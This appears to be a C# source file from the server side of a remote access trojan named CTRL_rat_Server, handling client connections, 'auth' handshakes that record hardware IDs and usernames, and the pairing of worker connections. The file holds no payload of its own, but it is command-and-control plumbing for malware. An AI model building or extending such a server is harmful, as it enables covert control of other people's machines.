using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using CTRL_rat_Server;

namespace CTRL_rat_Server
{
    public class handlers
    {
        public Action<node, Dictionary<object,object>> OnClientConnect;
        public Action<node> OnClientClose;
        public Action<node, Dictionary<object, object>> OnClientMessage;
        //public Action<node, byte[]> OnPartialMessage;
        public void Onclose(node client) 
        {
            Console.WriteLine(client.isalive);
            client.parent.nodes.Remove(client);
            new Thread(()=> OnClientClose(client)).Start();
        }
        public void Onmessage(node client, byte[] data)
        {
            Console.WriteLine(Encoding.UTF8.GetString(data));
            try
            {
                var response = client.JsonToDictionary(Encoding.UTF8.GetString(data));
                var opcode = (string)response["op"];
                if (opcode == "auth")
                {
                    var isworker = (bool)response["worker"];
                    client.hwid = (string)response["hwid"];
                    if (isworker)
                    {
                        var workerid = (string)response["workerid"];
                        foreach (node cli in client.parent.nodes)
                        {
                            if (cli.pending_workers.Contains(workerid))
                            {
                                cli.workers[workerid] = client;
                                return;
                            }

                        }
                        client.dispose();
                    }
                    else
                    {
                        string username = (string)response["username"];
                        string hwid = (string)response["hwid"];
                        Console.WriteLine(username);
                        new Thread(() => OnClientConnect(client, response)).Start();
                        //make it add more stuff later
                    }

                }
                else 
                {
                    new Thread(() => OnClientMessage(client, response)).Start();//pass off to user based handler
                }
            }
            catch 
            {
                new Thread(() => OnClientClose(client)).Start();
                //send a reconnect command
            }
            //parse (javascript deserailize)
            //check if auth
            //check if worker
            //if worker, look at all the node through client.parent.nodes, check through the nodes, check if it is waiting for that id, add the dictionarray with id, else, kill worker
            //else it will add to list: LATER!
        }
        public void Onpartialmessage(node client, int totalrecived, int dataleft)
        {


        }
        public void Onconnect(node client) 
        {
            var response = new Dictionary<object, object>();
            response["op"] = "auth";
            client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(response)));
        
        }
    }
}
